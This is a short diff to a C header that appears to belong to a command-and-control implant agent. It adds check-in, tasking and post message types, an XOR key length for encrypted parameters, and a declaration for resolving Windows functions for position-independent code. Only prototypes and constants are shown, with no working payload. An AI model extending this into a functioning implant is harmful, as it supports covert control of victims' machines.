@@ -1,5 +1,8 @@
 #include "HTTP.h"
 
+#define PARAM_BUFFER_LEN 1024
+#define XORKEY_LEN       128
+
 #define MESSAGE_TYPE_CHECKIN 1
 #define MESSAGE_TYPE_TASKING 2
 #define MESSAGE_TYPE_POST    3
@@ -191,10 +194,10 @@ void pack_char(char *buf, int *offset, char paydata);
 void pack_uint(char *buf, int *offset, unsigned int paydata);
 void pack_string(char *buf, int *offset, char *paydata);
 char unpack_char(char *buf, int *offset);
-int unpack_int(char *raw_params, int *offset);
+int unpack_int(char *buf, int *offset);
 unsigned int unpack_uint(char *buf, int *offset);
-char *unpack_str(char *raw_params, int *offset);
-void unpack_params(char *raw_params, AgentParams *params);
+char *unpack_str(char *buf, int *offset);
+void unpack_params(char *enc_params, char *key, AgentParams *params);
 void free_params(AgentParams *params);
 
 WIN32FUNCS resolve_pico_functions();
